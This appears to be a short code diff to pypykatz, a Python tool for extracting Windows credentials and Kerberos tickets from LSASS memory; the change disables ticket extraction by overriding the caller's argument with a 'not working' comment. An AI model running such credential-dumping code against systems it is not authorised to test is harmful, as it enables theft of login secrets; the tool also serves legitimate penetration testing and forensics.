@@ -241,7 +241,8 @@ class apypykatz:
 	
 	async def get_kerberos(self, with_tickets = True):
 		dec_template = KerberosTemplate.get_template(self.sysinfo)
-		dec = KerberosDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo)
+		with_tickets = False # Turning it off as it's not working for some reason
+		dec = KerberosDecryptor(self.reader, dec_template, self.lsa_decryptor, self.sysinfo, with_tickets = with_tickets)
 		await dec.start()
 		for cred in dec.credentials:
 			for ticket in cred.tickets:
